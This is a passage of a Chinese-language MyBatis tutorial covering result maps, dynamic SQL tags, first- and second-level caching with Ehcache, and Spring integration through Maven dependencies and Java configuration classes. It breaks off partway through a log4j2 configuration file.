/>\n    <result column="dname" property="dname" />\n    \x3c!-- oftype 定义集合中的泛型类型--\x3e\n    <collection property="employees" oftype="com.pwddd.mybatis.bean.employee" >\n        <id column="id" property="id" />\n        <result column="last_name" property="lastname" />\n        <result column="email" property="email" />\n        <result column="gender" property="gender" />\n    </collection>\n\n</resultmap>\n<select id="getdeptbyid" resultmap="depts" >\n    select e.id,e.last_name,e.email,e.gender,d.did,d.dname\n    from tbl_employee e, tbl_dept d\n    where d.did = e.did\n    and e.did = #{did}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 方式二：分步查询\n\n<resultmap id="deptsstep" type="com.pwddd.mybatis.bean.dept" >\n    <id column="did" property="did" />\n    <result column="dname" property="dname" />\n    <collection property="employees" select="com.pwddd.mybatis.mapper.employeemapperplus.getempbydid"\n                oftype="com.pwddd.mybatis.bean.employee" column="did" />\n</resultmap>\n\n<select id="getdeptbystep" resultmap="deptsstep" >\n    select * from tbl_dept where did = #{did}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 多列step查询\n\n如果需要分步查询，第一步查询的结果的多列作为第二步查询的条件，可以封装成map\n\ncolumn="{did=did,dname=dname}"\n\n\n1\n\n\n\n# 关于延迟加载\n\n针对分步查询可以单独设置懒加载\n\n fetchtype="eager" 不开启懒加载\n  fetchtype="lazy" 开启懒加载\n\n\n1\n2\n\n\n\n# 鉴别器\n\n鉴别器可以根据条件设置查询的结果，比如如果是女生才将dept的结果返回，如果是男生，则将lastname的值赋值给email的值。虽然没有意义，只用来测试。\n\n<resultmap id="gete" type="com.pwddd.mybatis.bean.employee" >\n<id column="id" property="id" />\n<result column="last_name" property="lastname" />\n<result column="gender" property="gender" />\n<result column="email" property="email" />\n<discriminator javatype="string" column="gender">\n<case value="0">\n<association property="dept" select="com.pwddd.mybatis.mapper.deptmapper.selectbyid" column="did"/>\n</case>\n<case value="1">\n<result column="last_name" property="email" />\n</case>\n</discriminator>\n</resultmap>\n\n\n<select id="gete" resultmap="gete" >\nselect * from tbl_employee where id = #{id}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 动态sql语句\n\n动态sql解决的是按照条件拼装sql的问题。使用不同的标签，mybatis可以根据传递的参数条件动态的拼接sql语句。\n\n\n# if标签\n\nif标签可以根据传入的参数判断是否拼接查询条件\n\n<select id="getempsbycondition" resulttype="employee" >\n    select * from tbl_employee\n    where\n    <if test="id!=null" >\n        id = #{id}\n    </if>\n\n    <if test="lastname != null">\n        and last_name=#{lastname}\n    </if>\n\n    <if test="email != null">\n        and email = #{email}\n    </if>\n\n    <if test="gender != null">\n        and gender = #{gender}\n    </if>\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# where标签\n\n这种拼接有一个问题，就是当id不存在时，后面的语句拼接会多一个and。常见的解决方法有两个：\n\n 1. where 后面拼接一个 1=1\n 2. 使用where标签，去除前置的and 或者 or条件\n\n第一种方式：\n<select id="getempsbycondition" resulttype="employee" >\n    select * from tbl_employee\n    where 1=1\n    <if test="id!=null" >\n        and id = #{id}\n    </if>\n\n    第二种方式：\n    <select id="getempsbycondition" resulttype="employee" >\n        select * from tbl_employee\n        <where>\n            <if test="id!=null" >\n                id = #{id}\n            </if>\n\n            <if test="lastname != null">\n                and last_name=#{lastname}\n            </if>\n\n            <if test="email != null">\n                and email = #{email}\n            </if>\n\n            <if test="gender != null">\n                and gender = #{gender}\n            </if>\n        </where>\n    </select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n上面的这种写法，如果在拼接条件时，and写在条件后面还会出问题，因为where标签只会删除掉第一个多余的and。\n\n<select id="getempsbycondition" resulttype="employee" >\n    select * from tbl_employee\n    <where>\n        <if test="id!=null" >\n            id = #{id} and\n        </if>\n\n        <if test="lastname != null">\n            last_name=#{lastname} and\n        </if>\n\n        <if test="email != null">\n            email = #{email} and\n        </if>\n\n        <if test="gender != null">\n            gender = #{gender}\n        </if>\n    </where>\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# trim标签\n\n使用trim标签，可以解决上述问题，trim标签有如下的属性：\n\n * prefix : 给语句加上一个前缀\n * prefixoverides : 覆盖掉前缀的字符串\n * suffix : 给语句加上一个后缀\n * suffixoverrides : 覆盖掉后缀的字符串\n\n上述的查询可以改成如下内容：\n\n<select id="getempsbycondition" resulttype="employee" >\n    select * from tbl_employee\n    <trim prefix="where" suffixoverrides="and">        \n        <if test="id!=null" >\n            id = #{id} and\n        </if>\n\n        <if test="lastname != null">\n            last_name=#{lastname} and\n        </if>\n\n        <if test="email != null">\n            email = #{email} and\n        </if>\n\n        <if test="gender != null">\n            gender = #{gender}\n        </if>\n    </trim>\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# choose标签\n\nchoose标签类似于java中的switch-case语句。\n\n<select id="getempsbyconditionchoose" resulttype="employee">\n    select * from tbl_employee\n    <where>\n        <choose>\n            <when test="id!=null">\n                id = #{id}\n            </when>\n\n            <when test="lastname != null">\n                and last_name = #{lastname}\n            </when>\n\n            <otherwise>\n                and gender = 1\n            </otherwise>\n        </choose>\n    </where>\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# set标签\n\nwhere标签中封装的是查询的条件，而set标签中封装的是更新条件。\n\n如果我们不使用set标签，而使用if标签拼接update语句的set条件的话，则会导致后面多一个逗号，sql执行报错。\n\n<update id="updateemp">\n    update tbl_employee\n    set\n    <if test="lastname != null">\n        last_name = #{lastname},\n    </if>\n    <if test="gender != null">\n        gender = #{gender},\n    </if>\n    <if test="email != null" >\n        email = #{email}\n    </if>\n\n    where id = #{id}\n</update>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n[2022-02-21 14:33:36:972-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - ==>  preparing: update tbl_employee set last_name = ?, where id = ?\n[2022-02-21 14:33:36:997-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - ==> parameters: lisi(string), 1(integer)\n\n\n1\n2\n\n\n使用set标签可以去除后面多余的逗号。\n\n<update id="updateemp">\n    update tbl_employee\n    <set>\n        <if test="lastname != null">\n            last_name = #{lastname},\n        </if>\n        <if test="gender != null">\n            gender = #{gender},\n        </if>\n        <if test="email != null" >\n            email = #{email}\n        </if>\n    </set>\n    where id = #{id}\n</update>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# foreach标签\n\nforeach标签用来遍历传递过来的list或者map，常用来做in查询或者批量新增。\n\nforeach标签有如下的属性可以选择：\n\n * collection: 传进来的集合参数\n * item: 遍历出来的单个值\n * open: foreach拼接的开始符号\n * close: foreach拼接的结束符号\n * separator: 元素之间的分隔符\n * index: 对于list来说，index是索引，item是value，对于map而言，index是key，item是value\n\nin查询employee\n\n<select id="getempsbyin" resulttype="employee">\n    select * from tbl_employee\n    where id in\n    <foreach collection="list" item="id" open="(" separator="," close=")">\n        #{id}\n    </foreach>\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\ninsert批量插入数据\n\n<insert id="addemps" >\n    insert into tbl_employee(id,last_name,gender,email)\n    values\n    <foreach collection="collection"  separator="," item="emp">\n        (#{emp.id},#{emp.lastname},#{emp.gender},#{emp.email})\n    </foreach>\n</insert>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n第二种方式需要数据库开启可以批量提交\n\njdbc.url=jdbc:mysql://localhost:3306/mybatis?allowmultiqueries=true\n\n\n1\n\n\n<insert id="addemps" >\n    <foreach collection="list" item="emp" separator=";" >\n        insert into tbl_employee(id,last_name,gender,email)\n        values (#{emp.id},#{emp.lastname},#{emp.gender},#{emp.email})\n    </foreach>\n</insert>\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 两个内置参数\n\nmybatis中有两个内置参数可以用来取值。\n\n * _parameter: 代表整个参数，如果传递多个参数，参数会被封装成一个map _parameter就代表这个map\n * _databaseid: 如果配置了databaseidprovider标签，则该值就代表我们配置的值。\n\n栗子：\n\n<select id="getdept" resulttype="dept" >\n    <if test="_databaseid=mysql">\n        select * from tbl_dept where did = #{did}\n    </if>\n</select>\n\n\n1\n2\n3\n4\n5\n\n\n\n# bind标签\n\nbind标签可以将ognl表达式绑定到一个变量上。我们可以使用如下的方式进行模糊查询\n\nsystem.out.println(mapper.getlikeemp("%a%"));\n\n\n1\n\n\n我们也可以将%放到sql语句中，但不能使用下面的方式：\n\nselect * from tbl_employee\nwhere last_name like "%#{lastname}%"  -- like后面的查询条件应该是一个整体\nselect * from tbl_employee\nwhere last_name like "%${lastname}%"  -- 拼接不安全\n\n\n1\n2\n3\n4\n\n\n我们可以使用bind将拼接进行绑定\n\n<select id="getlikeemp" resulttype="employee">\n    <bind name="_lastname" value="\'%\'+lastname+\'%\'"/>\n    select * from tbl_employee\n    where last_name like #{_lastname}\n</select>\n\n\n1\n2\n3\n4\n5\n\n\n\n# sql标签\n\nsql标签可以将多次的查询语句进行保存，下次使用直接引用。可以使用inclue进行引用。\n\n\n<sql id="emp">\n    id,last_name,email,gender\n</sql>\n\n<select id="getlikeemp" resulttype="employee">\n    <bind name="_lastname" value="\'%\'+lastname+\'%\'"/>\n    select \n    <include refid="emp" />\n    from tbl_employee\n    where last_name like #{_lastname}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\ninclue标签内可以自定义一些属性，然后使用${}取值。\n\n<sql id="emp">\n    id,${name},email,gender\n</sql>\n\n<select id="getlikeemp" resulttype="employee">\n    <bind name="_lastname" value="\'%\'+lastname+\'%\'"/>\n    select\n    <include refid="emp" >\n        <property name="name" value="last_name"/>\n    </include>\n    from tbl_employee\n    where last_name like #{_lastname}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 缓存\n\nmybatis中包含了一个非常强大的查询缓存特性，可以非常方便的配置和定制。缓存可以极大的提升查询效率。\n\nmybatis系统中默认定义了两级缓存。一级缓存，二级缓存。\n\n 1. 默认情况下，只有一级缓存（sqlsession级别的缓存，本地缓存）开启。\n 2. 二级缓存需要手动配置，是namespace级别的缓存\n 3. 为了提高扩展性。mybatis定义了缓存接口cache，我们可以实现cache接口实现定义二级缓存。\n\n\n# 一级缓存\n\n与数据库同一次会话产生的数据会放到一级缓存中，以后如果需要取相同的数据则直接从缓存中取。\n\n@test\npublic void testfirstlevel() throws ioexception {\n    string resource = "mybatis-config.xml";\n    inputstream resourceasstream = resources.getresourceasstream(resource);\n    sqlsessionfactory sqlsessionfactory = new sqlsessionfactorybuilder().build(resourceasstream);\n    sqlsession sqlsession = sqlsessionfactory.opensession();\n\n    try {\n        employeemappercache mapper = sqlsession.getmapper(employeemappercache.class);\n        system.out.println(mapper.getemp(1));\n        system.out.println(mapper.getemp(1));\n    }finally {\n        sqlsession.close();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n查询结果可以看出，只执行了一次查询\n\n[2022-02-21 19:26:09:969-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - ==>  preparing: select * from tbl_employee where id = ?\n[2022-02-21 19:26:09:994-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - ==> parameters: 1(integer)\n[2022-02-21 19:26:10:011-main] [debug] - org.apache.ibatis.logging.jdbc.basejdbclogger.debug(basejdbclogger.java:137) - &lt;==      total: 1\nemployee{id=1, lastname=\'wangwu\', gender=0, email=\'wangwu@qq.com\', dept=null}\nemployee{id=1, lastname=\'wangwu\', gender=0, email=\'wangwu@qq.com\', dept=null}\n\n\n1\n2\n3\n4\n5\n\n\n有以下几种情况导致缓存失效：\n\n * 不同的sqlsession\n * sqlsession相同，查询条件不同 - 缓存中没有\n * sqlsession相同，两次查询之间有增删改查操作\n * sqlsession相同，调用缓存清空sqlsesson.clearcache()\n\n\n# 二级缓存\n\n不同的sqlsession无法使用一级缓存，范围较小。当我们需要不同的sqlsession可以从缓存中查找数据，则需要开启二级缓存。二级缓存的作用域是namespace。\n\n二级缓存机制：\n\n 1. 一个会话，查询一条语句，这个数据会被存储在一级缓存中。\n 2. 会话关闭，一级缓存中的数据会被保存到二级缓存中，新的查询会访问二级缓存。\n 3. 不同的namespace查询的数据会对应自己的缓存空间。\n\n使用方法：\n\n 1. 开启全局二级缓存配置\n\n<setting name="cacheenabled" value="true"/>\n\n\n1\n\n 2. 去mapper中配置二级缓存\n\n<cache></cache>\n\n\n1\n\n\n二级缓存配置有以下可选参数：\n\n * blocking:\n * eviction: 缓存的回收策略\n   * lru: 最近最少使用的，移除长时间未被访问的对象\n   * fifo: 先进先出，按照对象存储的顺序，先进来的先出去\n   * soft: 软引用，移除基于垃圾回收器状态和软引用的对象\n   * weak: 弱引用，更积极的移除基于垃圾收集器状态和弱引用的相关对象\n   * 默认：lru\n * flushinterval：缓存刷新时间，默认不清空\n * readonly\n   * true： 只读，mybatis认为所有缓存中的数据都是只读操作，不会修改数据。为了加快速度，会将缓存中的内容直接交给用户，不安全速度快。\n   * false： 非只读，mybatis觉得数据是可以被修改的。mybatis会利用序列化等技术克隆一份新的数据给你。\n * size：缓存多少数据\n * type：指定缓存的全类名\n\n 3. pojo实现序列化接口\n\n@test\npublic void testsecondlevel() throws ioexception {\n    string resource = "mybatis-config.xml";\n    inputstream resourceasstream = resources.getresourceasstream(resource);\n    sqlsessionfactory sqlsessionfactory = new sqlsessionfactorybuilder().build(resourceasstream);\n    sqlsession sqlsession = sqlsessionfactory.opensession();\n    sqlsession sqlsession2 = sqlsessionfactory.opensession();\n\n    employeemappercache mapper = sqlsession.getmapper(employeemappercache.class);\n    employeemappercache mapper2 = sqlsession2.getmapper(employeemappercache.class);\n    employee emp = mapper.getemp(1);\n    sqlsession.close();\n    system.out.println(mapper2.getemp(1));\n    sqlsession2.close();\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n注意，只有当sqlsession关闭之后，才会将数据移动到二级缓存。\n\n\n# 缓存相关设置\n\n * cacheenabled 开启或者关闭二级缓存，配置在mybatis配置文件setting中\n * mapper配置文件对应的查询标签中，设置setcache=true，开启或者关闭二级缓存\n * 每个增删改标签上默认有flushcache=true，默认清空一级缓存和二级缓存\n * 在每个查询标签中默认有flushcache=false，默认不清空缓存\n * sqlsession.flushcache()默认清空一级缓存\n * localcachescope=[session|statement] 本地缓存作用域\n\n\n# 缓存工作原理\n\n\n\n\n# 第三方缓存ehcache\n\n 1. 导入ehcache包\n\n\x3c!-- https://mvnrepository.com/artifact/org.ehcache/ehcache --\x3e\n<dependency>\n    <groupid>org.ehcache</groupid>\n    <artifactid>ehcache</artifactid>\n    <version>3.9.9</version>\n</dependency>\n\n\x3c!-- https://mvnrepository.com/artifact/org.mybatis.caches/mybatis-ehcache --\x3e\n<dependency>\n    <groupid>org.mybatis.caches</groupid>\n    <artifactid>mybatis-ehcache</artifactid>\n    <version>1.2.2</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n 2. mapper中开启二级缓存\n\n<cache readonly="true" eviction="fifo" size="640000" type="org.mybatis.caches.ehcache.ehcachecache" />\n<cache-ref namespace="com.pwddd.mybatis.mapper.employeemappercache"/> <!-引用其他文件的缓存--\x3e\n\n\n1\n2\n\n 3. 配置ehcache配置文件\n\n<ehcache>\n\n\n    \x3c!--\n        磁盘存储:将缓存中暂时不使用的对象,转移到硬盘,类似于windows系统的虚拟内存\n        path:指定在硬盘上存储对象的路径\n     --\x3e\n    <diskstore path="java.io.tmpdir" />\n\n\n    \x3c!--\n        defaultcache:默认的缓存配置信息,如果不加特殊说明,则所有对象按照此配置项处理\n        maxelementsinmemory:设置了缓存的上限,最多存储多少个记录对象\n        eternal:代表对象是否永不过期\n        timetoidleseconds:最大的发呆时间\n        timetoliveseconds:最大的存活时间\n        overflowtodisk:是否允许对象被写入到磁盘\n     --\x3e\n    <defaultcache maxelementsinmemory="10000" eternal="false"\n                  timetoidleseconds="120" timetoliveseconds="120" overflowtodisk="true" />\n\n    \x3c!--\n        cache:为指定名称的对象进行缓存的特殊配置\n        name:指定对象的完整名\n     --\x3e\n    <cache name="com.zbaccp.entity.person" maxelementsinmemory="10000" eternal="false"\n           timetoidleseconds="300" timetoliveseconds="600" overflowtodisk="true" />\n\n\n</ehcache>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# 整合spring\n\n 1. 导入相关依赖包\n\n<dependencies>\n    \n      \x3c!--测试--\x3e\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-test</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  \n  <dependency>\n    <groupid>junit</groupid>\n    <artifactid>junit</artifactid>\n    <version>4.11</version>\n    <scope>test</scope>\n  </dependency>\n\n  \x3c!--spring 依赖 核心--\x3e\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-core</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-expression</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-beans</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-context</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  \x3c!--spring jdbc--\x3e\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-jdbc</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-tx</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-orm</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  \x3c!--spring web--\x3e\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-web</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-webmvc</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupid>javax.servlet</groupid>\n    <artifactid>servlet-api</artifactid>\n    <version>2.5</version>\n    <scope>provided</scope>\n  </dependency>\n\n  <dependency>\n    <groupid>org.thymeleaf</groupid>\n    <artifactid>thymeleaf-spring5</artifactid>\n    <version>3.0.12.release</version>\n  </dependency>\n\n  \x3c!--aop--\x3e\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-aop</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-aspects</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupid>cglib</groupid>\n    <artifactid>cglib</artifactid>\n    <version>2.2</version>\n  </dependency>\n\n  <dependency>\n    <groupid>aopalliance</groupid>\n    <artifactid>aopalliance</artifactid>\n    <version>1.0</version>\n  </dependency>\n\n  <dependency>\n    <groupid>org.aspectj</groupid>\n    <artifactid>aspectjweaver</artifactid>\n    <version>1.9.7</version>\n  </dependency>\n\n  \x3c!--mybatis--\x3e\n  <dependency>\n    <groupid>org.mybatis</groupid>\n    <artifactid>mybatis</artifactid>\n    <version>3.5.9</version>\n  </dependency>\n\n  <dependency>\n    <groupid>org.mybatis</groupid>\n    <artifactid>mybatis-spring</artifactid>\n    <version>2.0.7</version>\n  </dependency>\n\n  <dependency>\n    <groupid>org.mybatis.caches</groupid>\n    <artifactid>mybatis-ehcache</artifactid>\n    <version>1.2.2</version>\n  </dependency>\n\n  <dependency>\n    <groupid>org.ehcache</groupid>\n    <artifactid>ehcache</artifactid>\n    <version>3.9.9</version>\n  </dependency>\n    \n  <dependency>\n    <groupid>com.alibaba</groupid>\n    <artifactid>druid</artifactid>\n    <version>1.2.8</version>\n  </dependency>\n\n  <dependency>\n    <groupid>mysql</groupid>\n    <artifactid>mysql-connector-java</artifactid>\n    <version>5.1.21</version>\n  </dependency>\n    \n    \x3c!-- 其他辅助包 --\x3e\n\n  <dependency>\n    <groupid>org.apache.logging.log4j</groupid>\n    <artifactid>log4j-core</artifactid>\n    <version>2.17.1</version>\n  </dependency>\n\n    \x3c!--文件上传--\x3e\n\n  <dependency>\n    <groupid>commons-fileupload</groupid>\n    <artifactid>commons-fileupload</artifactid>\n    <version>1.4</version>\n  </dependency>\n    \n   \x3c!-- 响应json --\x3e\n\n  <dependency>\n    <groupid>com.fasterxml.jackson.core</groupid>\n    <artifactid>jackson-databind</artifactid>\n    <version>2.12.1</version>\n  </dependency>\n\n\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n\n 2. 配置web.xml(webinit)、spring、springmvc配置文件\n\nweb.xml/webinit\n\npackage com.pwddd.ssmdemo.config;\n\nimport org.springframework.web.filter.characterencodingfilter;\nimport org.springframework.web.filter.hiddenhttpmethodfilter;\nimport org.springframework.web.servlet.support.abstractannotationconfigdispatcherservletinitializer;\n\nimport javax.servlet.filter;\n\npublic class webinit extends abstractannotationconfigdispatcherservletinitializer {\n    @override\n    protected class<?>[] getrootconfigclasses() {\n        return new class[]{springconfig.class};\n    }\n\n    @override\n    protected class<?>[] getservletconfigclasses() {\n        return new class[]{webconfig.class};\n    }\n\n    @override\n    protected string[] getservletmappings() {\n        return new string[]{"/"};\n    }\n\n    @override\n    protected filter[] getservletfilters() {\n        characterencodingfilter characterencodingfilter = new characterencodingfilter();\n        characterencodingfilter.setforcerequestencoding(true);\n        characterencodingfilter.setencoding("utf-8");\n        hiddenhttpmethodfilter hiddenhttpmethodfilter = new hiddenhttpmethodfilter();\n        return new filter[]{characterencodingfilter,hiddenhttpmethodfilter};\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\nspring配置文件\n\npackage com.pwddd.ssmdemo.config;\n\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.componentscan;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.web.context.webapplicationcontext;\nimport org.springframework.web.servlet.viewresolver;\nimport org.springframework.web.servlet.config.annotation.enablewebmvc;\nimport org.springframework.web.servlet.config.annotation.viewcontrollerregistry;\nimport org.springframework.web.servlet.config.annotation.webmvcconfigurer;\nimport org.thymeleaf.spring5.springtemplateengine;\nimport org.thymeleaf.spring5.view.thymeleafviewresolver;\nimport org.thymeleaf.templatemode.templatemode;\nimport org.thymeleaf.templateresolver.itemplateresolver;\nimport org.thymeleaf.templateresolver.servletcontexttemplateresolver;\n\n@configuration\n@componentscan("com.pwddd.ssmdemo.controller")\n@enablewebmvc\npublic class webconfig implements webmvcconfigurer {\n\n    @override\n    public void addviewcontrollers(viewcontrollerregistry registry) {\n        registry.addviewcontroller("/").setviewname("index");\n    }\n\n\n    @bean\n    public itemplateresolver templateresolver(webapplicationcontext applicationcontext){\n        servletcontexttemplateresolver servletcontexttemplateresolver = new servletcontexttemplateresolver(applicationcontext.getservletcontext());\n        servletcontexttemplateresolver.setprefix("/web-inf/templates/");\n        servletcontexttemplateresolver.setsuffix(".html");\n        servletcontexttemplateresolver.setcharacterencoding("utf-8");\n        servletcontexttemplateresolver.settemplatemode(templatemode.html);\n        return servletcontexttemplateresolver;\n    }\n\n    @bean\n    public springtemplateengine templateengine(itemplateresolver templateresolver){\n        springtemplateengine springtemplateengine = new springtemplateengine();\n        springtemplateengine.settemplateresolver(templateresolver);\n        return springtemplateengine;\n    }\n\n    @bean\n    public viewresolver viewresolver(springtemplateengine templateengine){\n        thymeleafviewresolver thymeleafviewresolver = new thymeleafviewresolver();\n        thymeleafviewresolver.settemplateengine(templateengine);\n        thymeleafviewresolver.setcharacterencoding("utf-8");\n        return thymeleafviewresolver;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\nspringmvc\n\npackage com.pwddd.ssmdemo.config;\n\nimport com.alibaba.druid.pool.druiddatasource;\nimport org.mybatis.spring.sqlsessionfactorybean;\nimport org.mybatis.spring.annotation.mapperscan;\nimport org.springframework.beans.factory.annotation.value;\nimport org.springframework.context.applicationcontext;\nimport org.springframework.context.annotation.*;\nimport org.springframework.jdbc.datasource.datasourcetransactionmanager;\nimport org.springframework.transaction.annotation.enabletransactionmanagement;\n\nimport javax.sql.datasource;\nimport java.io.ioexception;\n\n@configuration\n@componentscan("com.pwddd.ssmdemo.service")\n@propertysource("classpath:jdbc.properties")\n@mapperscan("com.pwddd.ssmdemo.mapper")  // 配置mapper扫描\n@enabletransactionmanagement  // 开启事务\n@enableaspectjautoproxy(proxytargetclass = true)  // 开启aop aspect注解\npublic class springconfig {\n\n    @value("${jdbc.driver}")\n    private string driver;\n\n    @value("${jdbc.url}")\n    private string url;\n\n    @value("${jdbc.username}")\n    private string username;\n\n    @value("${jdbc.password}")\n    private string password;\n\n    @bean\n    public datasource datasource(){\n        druiddatasource druiddatasource = new druiddatasource();\n        druiddatasource.setdriverclassname(driver);\n        druiddatasource.seturl(url);\n        druiddatasource.setusername(username);\n        druiddatasource.setpassword(password);\n        return druiddatasource;\n    }\n\n    @bean\n    public datasourcetransactionmanager datasourcetransactionmanager(datasource datasource){\n        datasourcetransactionmanager datasourcetransactionmanager = new datasourcetransactionmanager();\n        datasourcetransactionmanager.setdatasource(datasource);\n        return datasourcetransactionmanager;\n    }\n\n    @bean\n    public sqlsessionfactorybean sqlsessionfactorybean(datasource datasource, applicationcontext applicationcontext) throws ioexception {\n        sqlsessionfactorybean sqlsessionfactorybean = new sqlsessionfactorybean();\n        sqlsessionfactorybean.setdatasource(datasource);\n        sqlsessionfactorybean.setconfiglocation(applicationcontext.getresource("classpath:mybatis-config.xml"));\n//        sqlsessionfactorybean.setmapperlocations(applicationcontext.getresources("classpath:mapper/*.xml"));\n        return sqlsessionfactorybean;\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\njdbc.properties\n\njdbc.driver=com.mysql.jdbc.driver\njdbc.url=jdbc:mysql://localhost:3306/ssmdemo\njdbc.username=root\njdbc.password=123456\n\n\n1\n2\n3\n4\n\n\nlog4j2配置文件\n\n<?xml version="1.0" encoding="utf-8"?>\n\x3c!--设置log4j2的自身log级别为warn--\x3e\n\x3c!--日志级别以及优先级排序: off > fatal > error > warn > info > debug > trace > all --\x3e\n\x3c!--configuration后面的status，这个用于设置log4j2自身内部的信息输出，可以不设置，\n    当设置成trace时，你会看到log4j2内部各种详细输出--\x3e\n\x3c!--monitorinterval：log4j能够自动检测修改配置 文件和重新配置本身，设置间隔秒数--\x3e\n<configuration status="warn" monitorinterval="30">\n    \x3c!--全局参数--\x3e\n    <properties>\n        \x3c!--<property name="logpath">/export/logs/bt-middle-data-main</property>--\x3e\n        <property name="logpath">./log</property>\n    </properties>\n    \x3c!--先定义所有的appender--\x3e\n    <appenders>\n        